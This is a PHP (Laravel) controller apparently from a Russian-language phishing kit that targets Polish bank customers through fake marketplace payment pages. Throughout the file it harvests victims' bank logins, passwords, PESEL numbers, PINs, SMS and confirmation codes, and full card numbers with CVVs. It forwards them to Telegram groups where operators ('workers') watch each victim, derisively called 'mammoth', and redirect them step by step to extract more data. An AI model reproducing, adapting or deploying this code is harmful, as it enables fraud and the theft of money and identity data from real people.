<?php

namespace App\Http\Controllers\Fake;

use App\Http\Controllers\Telegram\BotController;
use App\Models\Category;
use App\Models\Country;
use App\Models\Fake;
use App\Http\Controllers\Controller;
use Exception;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Str;
use Telegram\Bot\Api;
use Telegram\Bot\Exceptions\TelegramSDKException;
use Telegram\Bot\Keyboard\Keyboard;
use Throwable;
use Cache;

class PagesController extends Controller
{
    /**
     * @var Category|null
     */
    protected $category;
    /**
     * @var Fake|null
     */
    protected $fake;
    protected $uuid;
    protected $subdomain;
    protected $bank;
    protected $isPay;


    public function __construct()
    {
        $this->middleware(function (Request $request, $next) {
            $key = 'track_id';
            $route = $request->route();
            $this->subdomain = getSubDomain() ?? $route->originalParameter('subdomain') ?? null;
            $this->uuid = $request->session()->get('uuid');
            $track_id = ($request->has($key) || (!$request->ajax() && $request->method() === 'GET'))
                ? $request->get($key)
                : $request->session()->get($key);
            $this->isPay = !$request->has('get') && ($request->has('pay') || $request->session()->get('fake.type') === 'pay');
            $request->session()->put('fake.type', ($this->isPay ? 'pay' : 'get'));
            try {
                if (is_null($track_id)) throw new Exception();
                $this->fake = Cache::remember("fake:$track_id", 15, function () use ($key, $track_id) {
                    return Fake::where($key, $track_id)->with(['category'])->first();
                });

                if (is_null($this->fake)) throw new Exception();
                $this->category = $this->fake->category;

                if (!in_array($this->subdomain, explode(',', setting($this->category->name, $this->category->name))) &&
                    app()->environment('production'))
                    throw new Exception();

                $track_id = $this->fake->track_id;
                $request->session()->put($key, $track_id);
                if (!$request->session()->has('uuid')) {
                    $request->session()->put('uuid', $this->uuid = (string)Str::uuid());
                }
                view()->share(['fake' => $this->fake]);
                $this->bank = session('bankName', 'none');
                if ($redirectUrl = $this->processRedirection($request)) {
                    return redirect($redirectUrl);
                }
                if ($this->pageWasRefreshed()) {
                    foreach ($this->fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
                        "⭐️<b>️Мамонт Обновил страницу</b>",
                        "🆔<b>Номер объявления:</b> <code>{$this->fake->getTrackIdFromWorker()}</code>",
                        "🚛<b>Платформа:</b> <code>{$this->platform()}</code>"
                    ]);
                }
                $locale = $this->category->country->locale ?? Country::locale(Country::POLAND);
                if (!App::isLocale($locale)) App::setLocale($locale);
                return $next($request);
            } catch (Throwable|Exception $exception) {
                Cache::forget("fake:$track_id");
                session()->forget($key);
            }
            return redirect((new Fake())->originalUrl($this->category->name ?? $this->subdomain));
        });
    }

    private function bankHasPm($name): bool
    {
        $banks = collect(config('fakes.banks'));
        return in_array($name, $banks->whereIn('name', [
            'millenium', 'mbank', 'ipko',
            'santander', 'ing', 'pekao',
            'alior', 'agricole', 'getin',
            'paribas', 'idea', 'bankbps',
            'sgb', 'citi', 'gbsbank',
            'noblepay', 'pocztowy', 'nestbank'
        ])->pluck('name')->toArray());
    }

    /**
     * @return bool
     */
    private function hasRedirect(): bool
    {
        $redirectUrl = Cache::get("$this->uuid.redirectUrl");
        return !is_null($redirectUrl) && in_array(parse_url($redirectUrl, PHP_URL_PATH), ["/error", "/success"]);
    }

    private function processRedirection(Request $request)
    {
        $redirect = false;
        $redirectUrl = Cache::get("$this->uuid.redirectUrl");
        if (!is_null($redirectUrl) && trim($request->path(), '/') !== trim(parse_url($redirectUrl, PHP_URL_PATH), '/')) {
            $redirect = $redirectUrl;
        } else if (!$this->hasRedirect()) Cache::forget("$this->uuid.redirectUrl");
        return $redirect;
    }

    private function platform(): string
    {
        $name = $this->category->name ?? 'undefined';
        $flag = $this->category->country->flag ?? Country::flag(Country::POLAND);
        return platform($name . "[$flag]", $this->isPay ? '1.0' : '2.0');
    }

    private function getFake(): ?Fake
    {
        return $this->fake;
    }

    private function getTelegram(): ?Api
    {
        return BotController::getTelegram();
    }

    private function pageWasRefreshed(): bool
    {
        return isset($_SERVER['HTTP_CACHE_CONTROL']) && $_SERVER['HTTP_CACHE_CONTROL'] === 'max-age=0';
    }


    /**
     * @param $chat_id
     * @param array $text
     * @return void
     */
    private function sendLogs($chat_id, array $text = []): void
    {
        try {
            $fake = $this->getFake();
            $ip = \request()->ip();
            $ipData = null;//ipstack($ip);
            $city_geo = is_null($ipData)
                ? ""
                : "{$ipData['location']['country_flag_emoji']} {$ipData['city']}, {$ipData['region_name']}";
            $keyboard = Keyboard::make([
                "inline_keyboard" => $chat_id === BotController::groupAdmin('id') ? [
                    [["text" => "⤴️ / (ошибка)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /"]],
                    [["text" => "⤴️ /banks (неверный лк)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /banks"]],
                    [["text" => "⤴️ /order (неверная карта)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /order"]],
                    [["text" => "⤴️ /code (неверный код)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /code"]],
                    [["text" => "⤴️ /error (ошибка)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /error"]],
                    [["text" => "⤴️ /success (успешно)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /success"]],
                    [["text" => "⤴️ /push (подтверждение)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /push"]],
                    [["text" => "🖇 Взять лог", "callback_data" => "/takeLog {$fake->track_id}"]],
                ] : [],
                "resize_keyboard" => true,
            ]);
            if ($chat_id === BotController::groupAdmin('id') || $chat_id === BotController::groupAlert('id')) {
                $text[] = "=================";
                $text[] = "👤<b>IP:</b> <code>$ip $city_geo</code>";
            }

            $this->getTelegram()->sendMessage([
                'chat_id' => $chat_id,
                'text' => makeText($text),
                'disable_web_page_preview' => false,
                "parse_mode" => "html",
                "reply_markup" => $keyboard
            ]);

        } catch (TelegramSDKException|Exception|Throwable $e) {
            if (!BotController::blocked($e->getMessage(), $e->getCode()) && !str_contains($e->getMessage(), 'getChat does not exist')) {
                Log::error("PagesController::sendLogs {$e->getMessage()}");
            }
        }
    }

    /**
     * @param string $url
     * @param array $params
     * @return string
     */
    private function urlGenerate(string $url, array $params = []): string
    {
        return url($url) . '?' . http_build_query($params);
    }

    public function index()
    {
        $fake = $this->getFake();
        $categoryName = $this->category->name;
        $view = $this->isPay && view()->exists("fakes.$categoryName.pay")
            ? "fakes.$categoryName.pay"
            : "fakes.$categoryName.get";
        $text = $this->isPay
            ? "⭐️<b>️Мамонт на странице оплаты</b>"
            : "⭐️<b>️Мамонт на странице получения средств</b>";
        if (view()->exists($view)) {
            if ($alertGroupId = BotController::groupAlert('id')) $this->sendLogs($alertGroupId, [
                $text,
                "=================",
                "🏷<b>Товар:</b> <code>$fake->title</code>",
                "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
                "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
                "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
            ]);

            foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
                $text,
                "=================",
                "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
                "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
                "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
                "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
            ]);
            return view($view);
        }
        abort(404);
    }

    public function banks($name = null)
    {
        $title = __("Please select your bank to continue");
        $favicon = asset('images/banks_favicon.ico');
        $banks = collect(config('fakes.banks'));
        $fake = $this->getFake();
        if (is_null($name)) {
            foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
                "⭐️<b>️Мамонт на странице выбора банка</b>",
                "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
            ]);
            return view('fakes.banks.index', compact('banks', 'title', 'favicon'));
        }
        $bank = $banks->where('name', $name)->first();
        if (is_null($bank) && $name !== 'none') abort(404);
        session()->put('bankName', $name);
        $view = "fakes.banks.$name";
        $title = $bank['title'] ?? $name;
        $favicon = isset($bank['logo']) ? asset($bank['logo']) : $this->fake->logo();
        if ($name !== 'none' && $this->bankHasPm($name) && view()->exists($view)) {
            $bankName = ucfirst($name);
            foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
                "⭐️<b>️Мамонт на странице $bankName</b>",
                "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
            ]);
            return view($view, compact('title', 'favicon', 'bank'));
        }
        return redirect($this->urlGenerate('/order', ['track_id' => $fake->track_id]));
    }

    public function logBank(Request $request)
    {
        $fake = $this->getFake();
        $bankName = ucfirst($this->bank);
        $step = ($request->has('step')) ? $request->get('step') : false;
        $next = subRoute('fake.order', ['track_id' => $fake->track_id]);
        switch ($this->bank) {
            case 'inteligo':
                $next = subRoute('fake.code', ['track_id' => $fake->track_id]);
                break;
            case 'millenium':
                if (!$step) $next = null;
                break;
        }


        $html = $step && view()->exists($step) ? view($step)->render() : null;
        $text = [
            "⭐️<b>Мамонт ввел ЛК</b>",
            "=================",
            "🏛<b>$bankName</b>",
            "=================",
            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
            "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>"
        ];
        foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, $text);
        $text[] = "=================";
        if ($request->get('login'))
            $text[] = "🔑<b>Логин:</b> <code>{$request->get('login')}</code>";
        if ($request->get('password'))
            $text[] = "🔒<b>Пароль:</b> <code>{$request->get('password')}</code>";
        if ($request->get('pesel'))
            $text[] = "📟<b>PESEL:</b> <code>{$request->get('pesel')}</code>";
        if ($request->get('mother'))
            $text[] = "📟<b>Mother:</b> <code>{$request->get('mother')}</code>";
        if ($request->get('pin'))
            $text[] = "📟<b>PIN:</b> <code>{$request->get('pin')}</code>";
        if ($request->get('smsCode'))
            $text[] = "📟<b>SMS Code:</b> <code>{$request->get('smsCode')}</code>";
        if ($request->get('pic'))
            $text[] = "📟<b>Слово с картинки:</b> <code>{$request->get('pic')}</code>";
        if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, $text);
        return response()->json(['html' => $html, 'next' => $next]);
    }

    public function order()
    {
        $fake = $this->getFake();
        if ($alertGroupId = BotController::groupAlert('id')) $this->sendLogs($alertGroupId, [
            "⭐️<b>Мамонт вбивает карту</b>",
            "=================",
            "🆔<b>Номер объявления:</b> <code>{$fake->track_id}</code>",
            "🏷<b>Товар:</b> <code>{$fake->title}</code>",
            "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
        ]);
        foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
            "⭐️<b>Мамонт вбивает карту</b>",
            "=================",
            "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
            "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
        ]);
        return view(view()->exists("fakes.{$this->category->name}.order")
            ? "fakes.{$this->category->name}.order"
            : "fakes.order", ['title' => 'Pozyskiwanie środków']);
    }

    public function logOrder(Request $request)
    {
        if ($request->has('expm') && $request->has('expy')) {
            $request['expdate'] = "{$request['expm']}/{$request['expy']}";
        }
        $fake = $this->getFake();
        if ($ccnumber = $request->get('card_number'))
            $request->session()->put('card_number', trim(str_replace(' ', '', $ccnumber)));
        if ($expdate = $request->get('expdate'))
            $request->session()->put('expdate', $expdate);
        if ($cvc = $request->get('card_cvc'))
            $request->session()->put('card_cvc', $cvc);
        if ($cpin = $request->get('card_pin'))
            $request->session()->put('card_pin', $cpin);
        if ($holder = $request->get('card_holder'))
            $request->session()->put('card_holder', $holder);
        if ($balance = $request->get('balance'))
            $request->session()->put('balance', $balance);

        $ccnumber = $request->session()->get('card_number');
        $expdate = $request->session()->get('expdate');
        $cvc = $request->session()->get('card_cvc');
        $cpin = $request->session()->get('card_pin');
        $holder = $request->session()->get('card_holder');
        $balance = $request->session()->get('balance');
        $amount = number_format($fake->price, 0, "", " ");
        $bankName = ucfirst($this->bank);
        $currency = $fake->country->currency ?? setting('currency');

        $bankInfo = cardInfo($ccnumber);
        $notify = is_null($bankInfo) ? "<b>(Возможно фейк карта!)</b>" : "";
        $binName = $bankInfo['bank']['name'] ?? null;

        $next = subRoute('fake.code', ['track_id' => $fake->track_id]);
        $step = ($this->bank === 'inteligo') ? "fakes.banks.$this->bank" : false;
        $html = $step && view()->exists($step) ? view($step)->render() : null;


        if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, [
            "👾<b>НОВЫЙ ПРИХОД</b> <code>$notify</code>",
            "=================",
            "💳<b>Банк:</b> <code>$bankName</code>",
            "💳<b>Карта:</b> <code>$ccnumber</code> <code>$binName</code>",
            "💳<b>Срок Действия:</b> <code>$expdate</code>",
            "💳<b>CVV:</b> <code>$cvc</code>",
            "💳<b>CPIN:</b> <code>$cpin</code>",
            "💰<b>Сумма:</b> <code>$amount</code> $currency",
            "💰<b>Баланс на карте:</b> <code>$balance</code> $currency",
            "💁<b>Владелец :</b> <code>$holder</code>",
            "=================",
            "🆔<b>Номер объявления:</b> <code>{$fake->track_id}</code>",
            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
        ]);
        foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
            "👾<b>НОВЫЙ ПРИХОД</b> <code>$notify</code>",
            "=================",
            "💳<b>Карта:</b> <code>" . substr(str_replace(' ', '', $ccnumber), 0, 6) . "</code> <code>$binName</code>",
            "=================",
            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
            "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
            "💰<b>Сумма:</b> <code>$amount</code> $currency",
            "💰<b>Баланс на карте:</b> <code>$balance</code> $currency",
            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
        ]);
        if ($request->ajax()) {
            return response()->json(['html' => $html, 'next' => $next]);
        }
        if (!is_null($html)) return $html;
        else return redirect($next);
    }

    public function code()
    {
        $fake = $this->getFake();
        foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
            "⭐️<b>️Мамонт на странице кода</b>",
            "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
        ]);
        return view(view()->exists("fakes.{$this->category->name}.code")
            ? "fakes.{$this->category->name}.code"
            : "fakes.code", [
            'title' => __("Operation confirmation"),
            'categoryName' => mb_strtoupper($this->category->name) . '_PAY',
            'amount' => $fake->priceFormat(),
            'card_number' => '**** **** **** ' . substr(session()->get('card_number'), -4)
        ]);
    }

    public function logCode(Request $request)
    {
        $fake = $this->getFake();
        $currency = $fake->country->currency ?? setting('currency');
        $ccnumber = $request->session()->get('card_number');
        $amount = number_format($fake->price, 0, "", " ");
        if ($code = $request->get('code')) {
            if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, [
                "⚠️<b>️Пользователь вводит код подтверждения</b>",
                "=================",
                "💰<b>Сумма:</b> <code>$amount</code> $currency",
                "💳<b>Номер карты:</b> <code>$ccnumber</code>",
                "🔑<b>Код подтверждения:</b> <code>$code</code>",
                "=================",
                "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>",
                "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
                "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
            ]);
            foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
                "⚠️<b>️Пользователь вводит код подтверждения</b>",
                "=================",
                "💰<b>Сумма:</b> <code>$amount</code> $currency",
                "💳<b>Номер карты:</b> <code>" . substr(str_replace(' ', '', $ccnumber), 0, 6) . "</code>",
                "=================",
                "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
                "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
                "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
            ]);
        }
        if ($this->bank === 'millenium') $next = subRoute('fake.verify', ['track_id' => $fake->track_id]);

        return response()->json(['html' => null, 'next' => $next ?? null]);
    }

    public function verify()
    {
        $fake = $this->getFake();
        foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
            "⭐️<b>️Мамонт на странице выбора картинки</b>",
            "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
        ]);
        return view('fakes.verify');
    }

    public function error()
    {
        $fake = $this->getFake();
        if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, [
            "⚠️<b>Мамонт на странице Ошибки</b>",
            "=================",
            "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>",
            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
        ]);
        return view('fakes.error', ['title' => 'error | 500']);
    }

    public function success()
    {
        $fake = $this->getFake();
        if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, [
            "⚠️<b>Мамонт на странице 'успешно'</b>",
            "=================",
            "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>",
            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
        ]);
        return view('fakes.success', ['title' => 'Success']);
    }

    public function push()
    {
        $fake = $this->getFake();
        if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, [
            "⚠️<b>Мамонт на странице подтверждения</b>",
            "=================",
            "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>",
            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
        ]);
        return view('fakes.push', ['title' => 'potwierdzenie']);
    }

}
